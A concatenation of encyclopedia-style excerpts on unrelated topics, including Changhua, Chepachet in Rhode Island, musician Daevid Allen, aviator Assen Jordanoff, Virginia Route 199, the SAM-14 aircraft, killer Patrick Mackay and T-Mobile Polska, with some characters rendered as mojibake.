(ËèØÈôΩÂÖ¨Âúí) * Hsinding Old Street (Êñ∞Áî∫ËÄÅË°ó) * Kaihua Temple * Lai Ho Memorial Hall * Museum of Traditional Nan Bei Music and Theater * Nanyao Temple * National Changhua Living Art Center * Red Hair Well (Á¥ÖÊØõ‰∫ï) * Spring of Youth * Yuanching Temple * Yuan Ching Kaun Tradition Art Museum (ÂÖÉÊ∏ÖËßÄÊ∞ëËóùÈ§®) Transportation Changhua Train Station Changhua Bus Station Changhua Station is currently the only Taiwan Railways Administration station in Changhua City.

It is centered at the intersection of U.S. Route 44 ( Putnam Pike) and Rhode Island Route 102 (also known as Victory Highway and Chopmist Hill Road). Chepachet's ZIP code is 02814. As of the 2010 census, the CDP had a population of 1,675. History \\"Chepachet\\" was originally inhabited by the Pequot and Nipmuc natives; the name means \\"where rivers meet\\". During the American Revolution, Loyalists from Newport were exiled near Chepachet, including Thomas Vernon, who recorded election celebrations in Chepachet in 1776: > This being the day for the choice of Deputies (members of the General > Assembly). We are told that there is a very great resort of people of all > kinds at Chepasseh, and that it is a day of great frolicking. Our landlord > and his three sons are gone, having rigged themselves out in the best > manner. [A] man on horseback passed by (together with many others) with a > very large bag full of cakes made by Granne West (mother to the General > William West) which are to be sold to the people.Thomas Vernon Diary, pg. > 76‚Äì78 In 1842, Chepachet was the setting of the endgame of the Dorr Rebellion, which helped to win voting rights for non-landowners in a new state Constitution. Since 1926, the town has hosted the Ancients and Horribles parade, an annual Fourth of July event, notable for its political statements and ribald humor. In 1927, horror writer H. P. Lovecraft and his fellow writer C. M. Eddy, Jr. ventured to Chepachet in search of a place known as \\"Dark Swamp\\" of which they had heard rumors. They never located it, but the region inspired at least the opening of Lovecraft's story \\"The Colour Out of Space\\", and the setting contributed to Eddy's unfinished story \\"Black Noon\\". In the 1940s, a US Navy auxiliary ship, the fleet fuel oil tanker, USS Chepachet, was named after the Chepachet River which runs through the village. The ship's bell is displayed at the seat of town government, and the ship's surviving crew had a 50th anniversary reunion in the town in 1998. Beginning with a proclamation in 1976, May 25 is recognized as \\"Elephant Day\\". On that date in 1826, a popular elephant known as Betty the Learned Elephant from a traveling show was shot and killed while she was crossing the bridge spanning the Chepachet River. A group of six \\"hooligans\\" led by Canton Smith of nearby North Scituate faced charges for the crime. A commemorative plaque marks the historic location on the bridge. In the 1990s Chepachet gained brief national attention in episodes of The X-Files, as the fictional location of the youth summer home of main character Fox Mulder. In one episode set in Providence he mentions Chepachet is \\"20 miles on RI Route 8\\". There is no Route 8 in Rhode Island.

He was co-founder of the psychedelic rock groups Soft Machine (in the UK, 1966) and Gong (in France, 1967).McFarlane, 1999, Allen, Daevid. Gong Dreaming 1 (SAF Publishing) Biography =Early years= In 1960, inspired by the Beat Generation writers he had discovered while working in a Melbourne bookshop, Allen travelled to Paris, where he stayed at the Beat Hotel, moving into a room recently vacated by Allen Ginsberg and Peter Orlovsky. While selling the International Herald Tribune around Le Chat Qui P√™che and the Latin Quarter, he met Terry Riley and also gained free access to the jazz clubs in the area. In 1961 Allen travelled to England and rented a room at Lydden, near Dover, where he soon began to look for work as a musician. He first replied to a newspaper advertisement for a guitar player to join Dover-based group the Rolling Stones (no connection with the later famous band of that name) who had lost singer/guitarist Neil Landon, but did not join them. After meeting up with William S. Burroughs, and inspired by philosophies of Sun Ra, he formed free jazz outfit the Daevid Allen Trio ('Daevid' having been adopted as an affectation of David), which included his landlord's son, 16-year-old Robert Wyatt. They performed at Burroughs' theatre pieces based on the novel The Ticket That Exploded. In 1966, together with Kevin Ayers and Mike Ratledge, they formed the band Soft Machine, the name having come from the Burroughs novel The Soft Machine. Ayers and Wyatt had previously played in Wilde Flowers. Following a tour of Europe in August 1967, Allen was refused re-entry to the UK because he had overstayed his visa on a prior visit. He returned to Paris where he formed Gong along with his partner Gilli Smyth. They also formed the Bananamoon Band. Both projects were cut short as the two took part in the 1968 Paris protests which swept the city, handing out teddy bears to the police and reciting poetry in pidgin French. Allen admitted that he was scorned by the other protesters for being a beatnik. Fleeing the police, they made their way to Dei√†, Mallorca, where they had lived for a time in 1966 and had met the poet Robert Graves, a friend of Robert Wyatt's family. Returning to Paris in August 1969, they were offered the chance to make an album by the BYG Actuel label and so formed a new Gong band and recorded Magick Brother, released in March 1970. =1970s= In 1971 Allen recorded and released his first solo album, Banana Moon (sometimes spelled Bananamoon) for BYG Actuel. It did not feature his original 1968 Bananamoon Band rhythm section, but did feature Robert Wyatt, Gilli Smyth, Gary Wright, Pip Pyle, Maggie Bell and many others. Gong's lineup stabilized with Pip Pyle (drums) joining Daevid Allen (guitar & vocals), Gilli Smyth (vocals), Christian Tritch (bass) and Didier Malherbe (woodwinds). This group performed on the soundtrack to the film Continental Circus, poet Dashiell Hedayat's Obsolete and Gong's nominal second studio album, Camembert Electrique. In October, Allen, Smyth and the rest of Gong moved into an abandoned 12-room hunting lodge called Pavilion du Hay, near Voisines and Sens, 120 km south-east Paris. They would be based there until early 1974.Allen, Daevid. Gong Dreaming 2. SAF Publishing, 2009, pgs.52, 67, 291. In late 1972 they were joined by electronic musician Tim Blake. Later Steve Hillage and Pierre Moerlen also joined to record the Radio Gnome Invisible\\" trilogy which consisted of Flying Teapot, Angel's Egg and You. The band signed with Virgin Records in 1973 after BYG Records went bankrupt during recording of Flying Teapot at Richard Branson's Manor Studio. Gong was Branson's second Virgin release after Mike Oldfield's Tubular Bells. According to Allen, in his book Gong Dreaming 2, the idea of the flying teapot was influenced by Russell's teapot. Allen performing in Hyde Park, London, 1974 Allen left Gong in April 1975 and went on to record three more solo albums, Good Morning (1976), Now Is the Happiest Time of Your Life (1977) and N'existe pas! (1979). During these years, he lived in a hippie collective in Dei√† and contributed to the production of The Book of Am, an album by the band Can am des puig, loaning them a four-track TEAC reel-to-reel tape recorder. In late May 1977, Allen performed and recorded as Planet Gong, then reformed the \\"Radio Gnome Trilogy\\" version of the group for a one-off show at the Hippodrome, Paris, France. The show, the first Gong Reunion, featured Sting, Stewart Copeland and Andy Summers in their first live appearance as part of Mike Howlett's band Strontium 90, before Summers joined both Copeland and Sting in The Police. An edited version of the Gong concert was released later in 1977 as the double live album Gong est Mort, Vive Gong. In 1978 Allen moved to New York at the invitation of his old producer Giorgio Gomelsky, and was teamed up with the nascent Material to form the punk-influenced New York Gong. They toured the U.S. in the Spring of 1979, playing the classic Radio Gnome Invisible trilogy, and later recorded the studio album About Time. =1980s and 1990s= In 1981 Allen returned to Australia, taking up residence in Byron Bay where he worked on performance pieces and poetry. He performed with performance artist David Tolley as Ex (not to be confused with the Dutch punk band The Ex), using tape loops and drum machines. In 1989 he formed a new Gong band, Gongmaison, which toured and recorded a self-titled album. Reverting to the name Gong, they released Shapeshifter in 1992, which continued the classic Gong mythology of Zero the Hero. A second Gong Reunion event took place in London in 1994 and the \\"classic\\" lineup toured between 1996 and 2001, releasing a new studio album, Zero to Infinity in 2000. In 1996 he made a guest appearance on the track \\"Chant of the Twisted Mystics\\" on the album \\"Escape From Awkward Caucasia\\" by Byron Bay psychedelic / space rock band Freaks of Nature. In 1998 Allen co-founded the San Francisco-based psychedelic rock band University of Errors and the U.K. based jazz rock band Brainville 3, going on to record several studio and live albums with each. He also recorded with Spirits Burning, a space rock supergroup whose members include Alan Davey, Bridget Wishart, Karl E. H. Seigfried, and Simon House. Some of Daevid Allen's most experimental work was with the long running Los Angeles noise band Big City Orchestra, including live performances and more than a half dozen CD releases. Other projects around this time included the Invisible Opera Company of Tibet and the Magick Brothers. =2000s= Zafferana, Sicily, 2009 A project with his son, Orlando, and members of Acid Mothers Temple led to Acid Mothers Gong and the 2004 album Acid Motherhood, as well as an improvisation outfit entitled Guru And Zero. In November 2006 a Gong Family Unconvention was held in Amsterdam, which included a reunion of many former Gong members from the \\"classic\\" early 70s line-up. Further Gong concerts were held in London in June 2008, featuring many of the same line-up, including Allen himself, Gilli Smyth, Steve Hillage, Miquette Giraudy, and Mike Howlett. In November 2007, Allen held a series of concerts in Brazil, with a branch of Gong, which was called Daevid Allen and Gong Global Family (Allen on vocals and guitar, Josh Pollock on guitar, megaphone and percussion; Fred Barley on drums and percussion, Fabio Golfetti on guitar, Gabriel Costa on bass, Marcelo Ringel on flute and tenor saxophone), along with his other band University of Errors (Allen, Pollock, Michael Clare and Barley). The concerts took place in S√£o Paulo on 21 and 22 November and S√£o Carlos on 24 November. These musicians, minus Marcelo, recorded some new songs at studio Mosh, in S√£o Paulo. The S√£o Paulo concert of 21 November was then released only as a DVD (UK only) and as a CD by Voiceprint Records. The 2009 album 2032 featured the band's drummer since 1999, Chris Taylor, formerly of Roachford and Soul II Soul. Allen's son Orlando replaced Taylor in 2012. In 2013, in Devon, England, Allen performed solo material and poetry at an event entitled \\"Up Close with Daevid Allen\\". He also joined The Invisible Opera Company of Tibet (UK) on stage to perform songs, including the Gong song \\"Tried So Hard\\" ‚Äì a live recording of which appeared on the band's single, along with a studio version with Allen on vocals. His final studio album with Gong, I See You, produced by his son Orlando, was released in November 2014. The same year, he worked on Book of Intxixu, the second Can am des puig album, and New Start by Belgian musician Will Z., a tribute album to Dei√† musicians, the first posthumous album of Daevid Allen and Carmeta Mansilla, singer of Can am des puig. =Illness and death= On 12 June 2014, Allen underwent surgery to remove a cyst from his neck. It was determined to be cancerous and he subsequently underwent radiation therapy. In a statement, released on 5 February 2015, Allen wrote that the cancer had returned to his neck and also spread to his lungs, and that he was \\"not interested in endless surgical operations\\". He was \\"given approximately six months to live\\". On 13 March 2015, his son, Orlando Monday Allen, announced through Facebook that Daevid Allen had died. The Planet Gong website announced that Allen had died in Australia, at 1.05pm, \\"surrounded by his boys\\". Allen had four sons, two with Gilli Smyth and two with other mothers. Reviewing Allen's life, The Daily Telegraph said: > Allen revelled in being the court jester of hippie rock and never lost his > enthusiasm for the transcendent power of the psychedelic experience. He once > remarked: \\"Psychedelia for me is a code for that profound spiritual > experience where there is a direct link to the gods.\\" That he never attained > the riches and fame of many of his contemporaries did not concern him.

October 19, 1967, White Plains, New York) was a Bulgarian inventor, engineer, and aviator. Jordanoff is considered to be the founder of aeronautical engineering in Bulgaria, as well as a contributor to the development of aviation in the United States. He occupied a distinct place among pilots of his time, the golden age of airmanship; in America, Jordanoff gained almost legendary status for his many roles as test pilot, airmail and air taxis pilot, stunt pilot, and flying instructor. He worked as an engineer for a number of companies, including Curtiss-Wright, Boeing, Lockheed, North American, Consolidated, Chance-Vought, Douglas and Piper, where he produced instruction books and manuals for famous airplanes such as the Curtiss P-40 Warhawk, the Lockheed P-38 Lightning, the North American B-25 Mitchell, the Boeing B-17 Flying Fortress, the Consolidated B-24 Liberator, the Boeing B-29 Superfortress, and the Douglas DC-3. Jordanoff was also well known for his numerous educational publications on aeronautics, including his inventions outside the realm of aviation.Asen Yordanov Background Asen Hristov Yordanov was the son of a polyglot economist/chemist, Hristo Yordanov. Hristo graduated from the University of Stuttgart in Germany and later obtained a doctorate from the University in Aachen, Germany, where he specialized in the analysis and production of wool and later silk, publishing several important findings on the process. In Bulgaria, Hristo worked in the Ministry of Economics and Agriculture as well as the Sofia bank. The Yordanov's were fairly wealthy, and owned several coal and copper mines, as well as a family farm. In turn, Asen was educated early. Asen's mother, Dochka Tsoneva, was the daughter of a rich tobacco producer from Razgrad. She studied piano and opera singing in Turin, Italy. Very well-read, Tsoneva found an interest in fine cuisine and published a famous cookbook. She also wrote poems and a number of plays, not meant to be published. Asen had five siblings. His sister Milka Toteva, a violinist, also made a successful career in the United States. Childhood and youth From a very young age, Asen Yordanov was interested in flight. He built kites as a child, and as an adolescent attended lectures on physics at the local university. In his teens, Yordanov invented a dark box, a simple substitution to the use of an entire dark room in photograph development. Later, his father would take Yordanov to Italy, Switzerland and France, where Yordanov learned of the many innovations in transportation, notably the motorcycle. Asen was temporarily lodged in a boarding school in Geneva, where he learned French. He continued his studies in Bulgaria. =The glider= In 1912, at the age of 16, Yordanov built his first workable glider. A local Bulgarian newspaper, dated February 16, 1912, published an article entitled 'First Bulgarian glider', which read: 500px :In the last few days, on the field between the infantry camp and the pioneer barracks, a very young Bulgarian aviator drills with his glider built by himself. He is a high school schoolboy, Asen Yordanov, the son of the Administrator of the Bank of Agriculture. He is fifteen, passionately keen on aviation and as a child fashioned toys that could fly. Last year, when visiting France and Italy, he saw the biplane of Maslennykov and Tchernyak, and from then on thought seriously to conquer the air himself. His glider is a very simple, light affair, based on the constructions of the Wright brothers and of Farman. It is 7 meters long, 1.20 m wide, with a surface area of 14 m2 and weights 23 kg. Yesterday he flew for over 12 minutes and reached an altitude of 10 to 12 meters. This young man's glider deserves praise, especially from aviation specialists. The exact date of the first flight is unclear, but after it, on February 5, the young flier made a second test flight in the presence of an official commission. Young Asen was invited to take another trip to France by a rich couple from Rousse, who had no children, and to go with them on summer holiday to Paris. In 1912, the first Salon de l'Aviation took place in Paris, presenting the latest aeronautic achievements and the latest planes, demonstrated by the top pilots of the day. In turn, Yordanov, above all, planned to find a means of admission to the well-known Bl√©riot school in √âtampes, knowing fully well the unlikelihood of a 16-year-old boy from then newly formed Bulgaria to gain admittance. This was until he met the well-known Bulgarian aviator Lieutenant Simeon Petrov, who introduced him to Louis Bl√©riot himself. He wasn't officially enrolled and there was no diploma for him, but attending the famous flying school in the company of great aviators played a huge role in Yordanov's educational development. After graduation, all the Bulgarians in the school were gathered and notified that the Turks are planning to invade Bulgaria. =Balkan Wars= The First Balkan War, led by Bulgaria, Serbia, and Greece against Turkey, was shortly followed by the Second Balkan War, led against Bulgaria by its former allies. At 17, Asen Yordanov volunteered for the army, with his father's reluctant consent. Though never in any imminent danger, Asen Yordanov served his part during the war as car driver; most of his time he frequented the airplane hangars. Colonel Radul Milkov would later recall: :I would often see the boy, drawing paper in hand, sitting in hangars or in the repair shop and copying the design of the parts from dismantled machines. He would also note down measurements of the length, height and width of this or that part, for instance the ribs and flat surfaces of the plane or all that made up the fuselage.'= In the Aeroplanno Otdelenie division, Asen Yordanov gained expertise, he designed the first Bulgarian-made airplane, and it was built in the summer of 1915. Yordanov test flew the plane, and it was subsequently named the Diplane (biplane) Yordanov-1. He sold the plane's design to the military and they started to produce it. In one year's time Bulgaria already had 23 airplanes. August 10, 1915, was considered the beginning of Bulgarian aircraft industry. Yordanov already became known as designer, mathematician, and inventor at his young age. He introduced a valuable new device, namely a feature which prevents the plane from losing altitude, into the new plane. Asen Yordanov's airplane was at a first look similar to the planes of that time. It was a biplane with relatively short wings, to decrease the body weight and with increased spacing between them to improve the aerodynamic effect of the lower wing. The wing section was similar to that of Albatros. The cockpit and the fuselage were conceived with great care to diminish drag. The landing gear was reinforced with double tires for stability and safety when landing. The tail, vertical and horizontal stabilizers and the ailerons were similar to those built by Louis Bl√©riot. The innovation that helped at landing and at recovery from stalls was something like contemporary flaps, added between the wings. Yordanov was awarded a scholarship to study abroad for his construction. His next and even more ambitious project was a heavier multi-engine plane. Unfortunately the rise of World War I cancelled his plans. Adulthood =World War I= After finishing secondary school in Sofia, Yordanov was drafted for World War I. He entered the military school at Bozhuriste, near Sofia. On graduation, Jordanoff was promoted to lieutenant and was assigned to the air force. He took part as a pilot in 84 military missions. He ended the war being awarded several insignias of honor, most important of which was the Order for bravery. The war was disastrous for Bulgaria, leaving the country to deal with heavy war reparations and practically destroyed economy. =Emigration to America= In May 1921 Asen Yordanov and his wartime friend, Alexander Stoyanov, read about a contest to fly around the world in 100 days. The first plane to make it would win one million dollars. Yordanov and his partner were fully supported by the then prime-minister Aleksandar Stamboliyski and were granted US$6,000 /participation fee-US$2500/ by the Bulgarian Ministry of War to participate in the initiative, and they traveled to the US. However, Yordanov and Stoyanov were the only candidates and therefore the contest was postponed and later canceled. Nonetheless, Yordanov decided to remain in the United States, where he later found his new home. He also anglicized his surname to \\"Jordanoff\\". =Aviation career= Faced with the dilemma of knowing absolutely no English, Assen Jordanoff began his life in America shoveling snow in New York for small pay. After the snow melted, Jordanoff was able to find a job at a construction work on a skyscraper. Having a job, he spent all his free time at the Public Library, studying English by himself or reading books and manuals on subjects such as aeronautics, machinery, and mechanics. At that time he became known among his friends and colleagues as Jerry, rather than Assen, a familiar name that would stick with him for the rest of his life. Jordanoff then got a job at the Curtiss-Wright Corporation. Having his English improved, Assen Jordanoff went on to take university courses in engineering, aeronautics, radio electronics, physics, and chemistry. At the same time he graduated from a flying school; his instructor was William Winston, who was also Charles Lindbergh's flight instructor. Jordanoff moved later to Curtiss-Wright, therefrom he would emerge as a test pilot and in parallel as a sales manager, a pilot of air taxis, a stunt pilot and above all a flying instructor. He also specialized in flying under complex weather conditions. Jordanoff was still just in his late 20s. Jordanoff was invited by Thomas Edison to visit him at his home in Menlo Park, New Jersey as Edison was at the stage of developing a proto-radar and was also interested in helicopters, a research project in which Assen Jordanoff was involved at the same time. They collaborated designs and worked together for several months. Later years =Jordanoff's business= In the 1930s and early 1940s Jordanoff wrote a number of illustrated books on problems of aviation, which became a Bible for future aviators. More than 750,000 copies of his books were sold in the US. Some of them were translated in other languages. After 1940 began a major period in Assen Jordanoff's career. During the next ten years, he established and presided over his own business enterprises: The Jordanoff Aviation Corporation, followed by The Jordanoff Corporation and then The Jordanoff Company, before the creation in 1946 of Jordanoff Electronics. In aeronautics, the Jordanoff companies collaborated with such firms as Douglas, Chance-Vought, Lockheed, Curtiss-Wright, McDonnell, Boeing, North American, Consolidated, and Piper. At the request of many, Jordanoff, as a designer and engineer within his own enterprise, compiled instruction books and manuals for the operation and maintenance, inspection and repair for some well-known aircraft such as the Lockheed P-38 Lightning, a very versatile aircraft used during World War II mainly as high-speed, high-altitude fighter, long-range escort fighter and photo reconnaissance plane; the Curtiss P-40 Warhawk, America's foremost fighter in service when World War II began; the Boeing B-17 Flying Fortress and the Boeing B-29 Superfortress, the best long-range bombers in World War II; the Consolidated B-24 Liberator and the North American B-25 Mitchell bombers, and the Douglas DC-3 transport aircraft. A very important activity was the preparation and the distribution of thousands of copies of descriptive books and practical manuals for aircraft. Jordanoff also became renowned for his many articles and publishing on aviation, as well as his commentaries and editorials. He was presented as a prominent authority on all the areas of aviation. Jordanoff eventually became the largest American publisher and editor of specialized military manuals. In the 1940s Jordanoff was assigned the task by the United States Department of Defense to prepare instruction manuals for military aircraft, submarines and aircraft carriers, on topics like land support with radio equipment, air meteorology, theoretic and flight preparation of the pilots for diurnal and nocturnal piloting. These were for crew use, inspection, maintenance and repair. Aside from his many patents on plane design, Jordanoff also introduced the so-called Jordaphone from his Electronics company, a wireless telephone, with an answering function and amplifier and intercom functions. It was the first of its kind, and preceded the modern inventions of the answering machine and tape recorder by 5 to 30 years. Another invention was the Frozen Gasoline System for airplanes. The idea was to super-cool the fuel in an aircraft's tank with dry ice and alcohol, thus making it inflammable. This system was never finally implemented, but its principles were later adopted in different forms. Further inventions of note included The Reverse Thrust device, which was made to decrease the specific fuel consumption and to increase the thrust of jet engines. The world's first air bag, meant to ensure the safety of pilots and automobile drivers alike, was designed by Jordanoff in (1957). The Stratoport resumed Jordanoff's interest in aviation. A special company was established: The Stratoport Corporation of America (1956). It owned the patent issued for a field of two unidirectional no-cross runways, set end-to-end and elevated to slow-down planes that are landing and to speed-up those taking off. The runways were screened by high perforated fences that reduced crosswinds. The high screens were also expected to reduce the noise as well as the elevated ends to reduce the length and the area needed for runways. Nonetheless, as was the case with the Jordaphone, the new concept was too ambitious and modernistic. Jordanoff married in 1929 Alice Grant Patton. She was ten years older than he was. They divorced in 1942. In 1942 he married his second wife Diana. They divorced in 1950 after his financial collapse. In 1955 he married Lucile Andrews. When in 1962 Jordanoff retired, he settled with her in a small cottage in Harrison, New York. Legacy Jordanoff's popularity in America became almost legendary, as he was often the subject of many anecdotes and arguments. Jordanoff was made an honorary citizen of New York City, his name appeared in Who's Who. The Smithsonian National Air and Space Museum holds his papers and mementoes. . Assen Jordanoff died October 19, 1967, aged 71, in St. Angels Hospital in White Plains, New York. His ashes were dispersed from a plane by some of his friends.

Known for most of its length as Humelsine Parkway, the state highway runs from Interstate 64 (I-64) and SR 646 in Lightfoot to SR 641 near Williamsburg. VA 199 forms a western loop of Williamsburg in York and James City Counties. The state highway, which is entirely a four-lane limited-access highway with a mix of intersections and interchanges, provides access from I-64 to several highways that serve attractions around Williamsburg, including U.S. Route 60 (US 60) and Colonial Parkway, an automobile parkway that leads to Colonial Williamsburg, Jamestown, and Yorktown. VA 199 between its junctions with I-64 is named for Carlisle H. Humelsine, a former curator and president of Colonial Williamsburg, in 2004. Route description View east along SR 199 just south of US 60 in Lightfoot, James City County VA 199 begins at I-64 Exit 234, a partial cloverleaf interchange, in Lightfoot in the northwest corner of York County. The roadway continues north as SR 646 (Newman Road), which reduces to two lanes just north of the interchange on its way to York River State Park. VA 199 heads southwest as a four-lane freeway, paralleled by another section of SR 646, Lightfoot Road, on the eastbound (south-facing) side and Rochambeau Drive on the westbound side of the highway. The state highway meets SR 603 (Mooretown Road) at a cloverleaf interchange between a big box shopping center on the east and the Williamsburg Pottery Factory grounds to the west. VA 199 crosses over Old Mooretown Road, CSX's Peninsula Subdivision, and US 60 (Richmond Road), entering James City County immediately before an interchange with US 60 on the south side of the tracks. The state highway curves south, passing through a forested corridor between residential subdivisions and has partial cloverleaf interchanges with SR 612 (Longhill Road) and VA 321 (Monticello Avenue). VA 199's western freeway section ends at an intersection with VA 5 (John Tyler Memorial Highway). VA 5 joins VA 199 in a concurrency as the highway curves to the southeast and enters the city of Williamsburg. VA 5 leaves the highway at the intersection with VA 31 (Jamestown Road). VA 31 heads southwest towards Jamestown while SR 5 and SR 31 together head northeast toward downtown Williamsburg and the campus of the College of William & Mary. VA 199 crosses the boundary between the city of Williamsburg and James City County twice more before leaving the city limits for good prior to the intersection with Brookwood Drive. VA 199 curves to the east and crosses College Creek before a combined intersection and interchange with VA 132 (Henry Street) and Colonial Parkway. VA 199 meets VA 132 at an intersection from which all movements to and from westbound Colonial Parkway (toward Jamestown) can be made. Access to eastbound Colonial Parkway (toward Williamsburg and Yorktown) is made via tight cloverleaf ramps. VA 199 meets Mounts Bay Road and Quarterpath Road at an intersection before beginning its eastern freeway segment. The state highway meets US 60 (Pocahontas Trail) and VA 143 (Merrimac Trail) at adjacent partial cloverleaf interchanges. Between the interchanges VA 199 crosses over both highways and the Peninsula Subdivision rail line that separates the two highways, re- entering York County in the process. VA 199 curves to the northeast ahead of a cloverleaf interchange with I-64 (Exit 242), where the freeway section ends. The state highway intersects Marquis Parkway and Water Country Parkway before passing the entrance to Water Country USA. VA 199 continues north through a forested area to its northern terminus at SR 641 (Penniman Road). SR 641 heads west from the intersection toward Williamsburg and continues north along VA 199's alignment, reducing to two lanes as the highway heads toward a junction with Colonial Parkway and the Naval Supply Center Cheatham Annex.

Design and development The single engine, high wing Moskalyev SAM-5bis-2 was a 1934 light transport developed into four different types, of which the SAM-14 was the penultimate. Apart from having a more powerful, inline engine, it was similar to the original. It had the same high-set two spar, cantilever wing as the SAM-5bis-2, with ply-skin ahead of the forward spar forming a torsion resistant box. The whole surface, including the ply-skinned leading edge, was fabric covered. The SAM-14's wings had Kalman flaps. It was powered by a nose- mounted Voronezh MV-4 4-cylinder, air-cooled, inverted inline, a licence-built Renault 4Pei engine. The fuselage had a wooden girder structure and was plywood-covered forward of the rear of the cabin, under the trailing edge, and fabric covered aft. The pilot's enclosed cockpit was ahead of the wing leading edge and its five-place passenger cabin was behind him under the wing, with three windows on each side and two port side doors. Behind the cabin the fuselage was fabric covered, narrowing to the SAM-5bis-2-style tail, with a blunted triangular fin and more rounded rudder. A triangular plan tailplane was mounted on top of the fuselage and carried rounded, tabbed elevators, separated for rudder movement. The SAM-14 had wide-splayed cantilever landing gear, each side with a landing leg and drag strut within a common fairing. The few photographs show it on short main skis and a tail ski. Operational history The date of the SAM-14's first flight is not known but official testing began in November 1939 and continued until June 1940. Production was initially approved but then cancelled by higher authority.

Early life Patrick Mackay was born to Harold Mackay and his wife, Marion Mackay, a woman of creole descent who he had met in Guyana. As a child, Mackay was a frequent victim of physical abuse at the hands of Harold. When Mackay was 10, Harold died from a heart attack on his way to work ‚Äì the result of complications of alcoholism and a weak heart. His final words to his son were 'remember to be good'.Patrick Mackay, psychopathic repeat killer ‚Äì Crime Library article part 2 Patrick was said to be unable to come to terms with the loss of his father, telling people Harold was still alive and keeping a photograph of him on his person. He refused to attend the funeral in Scotland and later assumed the role of 'father figure' within the family and beating his mother and two sisters. His mother Marion eventually moved the family from Dartford to Gravesend, but family life did not improve and the police were called to the home as frequently as four times a week. Mackay was removed from his family home on 18 occasions between the ages of 12 and 22, and put into various specialist schools, institutions and prisons. During this time, both a police officer and teacher predicted that Patrick would go on to kill. Mackay was prone to extreme tantrums and fits of anger, and indulged in animal cruelty and arson (at one point setting his pet tortoise on fire). He bullied younger children, stole from elderly women's homes and from people in the street, and even attempted to kill his mother and aunt. He also attempted to kill a younger boy, and later said he would have succeeded had he not been restrained.Patrick Mackay, psychopathic repeat killer ‚Äì Crime Library article part 4 He also attempted to set fire to a Catholic church. At 15, he was diagnosed as a psychopath by a psychiatrist, Dr. Leonard Carr, who predicted Mackay would grow up to be a \\"cold, psychopathic killer.\\" In October 1968, he was committed to Moss Side Hospital, Liverpool as a diagnosed psychopath. He was released in 1972.British maniac Patrick Mackay and the system's Failure Adulthood and murders As he entered adulthood, Mackay developed a fascination with Nazism, calling himself \\"Franklin Bollvolt the First\\" and filling his flat with Nazi memorabilia. He lived in London and was frequently drunk or on drugs. In 1973, near his mother's home in Kent, he met and was befriended by a priest, Father Anthony Crean.'Psychopath: The Devil's Disciple', Prof. David Wilson, Documentary, Series 1, Episode 5. Despite this friendship, Mackay broke into Crean's home and stole a cheque for ¬£30. Although Crean tried to persuade the police not to, Mackay was arrested and prosecuted. He was subsequently ordered to pay compensation, but never did. The incident caused a rift between the two and Mackay returned to London.Patrick Mackay, psychopathic repeat killer ‚Äì Crime Library article part 9 It was around this time, Mackay later claimed, that he had drowned a tramp in the River Thames. On 21 March 1975, then aged 22, Mackay used an axe to kill Father Crean at the priest's home in the village of Shorne, hacking through the victim's skull and watching him bleed to death. He was swiftly arrested after a police officer recalled the incident between Father Crean and Mackay 18 months earlier. Mackay was soon considered by police to be a suspect in at least a dozen other killings over the previous two years, most victims being elderly women who had been stabbed or strangled during robberies. Mackay later claimed to have murdered 11 people. Mackay was eventually charged with five murders, but two charges were dropped due to a lack of evidence. In November 1975 he was convicted of manslaughter (due to diminished responsibility) and sentenced to life imprisonment. Still imprisoned more than 44 years later, he is reported to be among the 50 or so prisoners in the United Kingdom incarcerated under a whole life tariff and unlikely ever to be released. Mackay is currently considered for release after reportedly spending time in an open prison. However, in June 2020, the hearing of the Parole Board has been postponed amidst a fresh investigation into Mackay's involvement in unsolved murders.

The company was formerly named Polska Telefonia Cyfrowa and operated under the name Era, until being rebranded as T-Mobile on 5 June 2011. As in other European countries, the company operates a GSM network. Following a decade-long ownership dispute with the French Vivendi corporation, the company has been wholly owned by the German telecommunications provider Deutsche Telekom since 2010. History On 26 February 1996 'Polish Digital Telephony' won a license to provide telecommunications services paging number 602 and permission to build a mobile radio communication network according to the standard GSM in the 900 MHz band, which was later extended to GSM 1800 MHz. The first test (non-commercial) base stations were launched during the International Trade Fair in June 1996 and a few base stations in Warsaw. The commercial launch of the network took place on 16 September 1996. At the end of 2004, Era had over 8.6 million customers and was the largest mobile phone network operator in Central Europe, and by the end of June 2011 it had 13.2 million subscribers, placing it third in the market with 30% market share. Era was one of Poland's most recognizable domestic brand names, partly because the company pursued an aggressive advertising campaign that made Era billboards, sponsored events, and other commercials ubiquitous in Poland. Towards the end of 2005, Era became the first mobile phone operator in Poland (and eighth in Europe) to have 10 million customers. The 10,000,000th client signing was celebrated with a concert by Van Morrison in Warsaw. Era was the first operator in the country to launch a HSDPA service in October 2006. Services =Tak Tak= The company's prepaid mobile phone service is called Tak Tak (Yes Yes), and has remained under T-Mobile branding. =Heyah= The Heyah logo was introduced in a \\"teaser\\" campaign before it was revealed what the product it represented was Heyah is a pay-as-you-go brand offered by Polish GSM provider Polska Telefonia Cyfrowa. The brand was introduced in 2004 but makes no reference to either T-Mobile or Era in its branding. Although it is marketed primarily toward young people, it had a substantial effect on the Polish mobile telephony market with its significantly lower prices and one-second billing. Within a month of launch it had attracted over one million users. =My Wallet= In October 2012, the company launched a commercial NFC wallet service in Poland called \\"MyWallet\\". The MyWallet services include NFC payment of two MasterCard credit cards and one Mifare transit fare-collection card. Marketing T-Mobile signed a two-year sponsorship deal in June 2011 with the Ekstraklasa football league, the top-level league in Polish football. Its official name at the time was T-Mobile Ekstraklasa. The company has proposed to promote the use of new technologies within the game, as well as offering Polish football fans a series of promotional deals. In 2017, the league has been renamed to Lotto Ekstraklasa for sponsorship purposes, with the deal reported to be worth US$7.2 million annually. http://www.sportspromedia.com/news/t-mobile_title_sponsor_the_polish_ekstraklasa/ In January 2013, T-Mobile Polska started a marketing campaign involving the figure of Vladimir Lenin who was the leader of the Soviet Russia during the Polish‚ÄìSoviet War (1919‚Äì1920). The campaign was intended to promote the brand of Heyah. The TV and billboard advertisements resulted in a debate on business ethics. The campaign has been viewed as unethical.

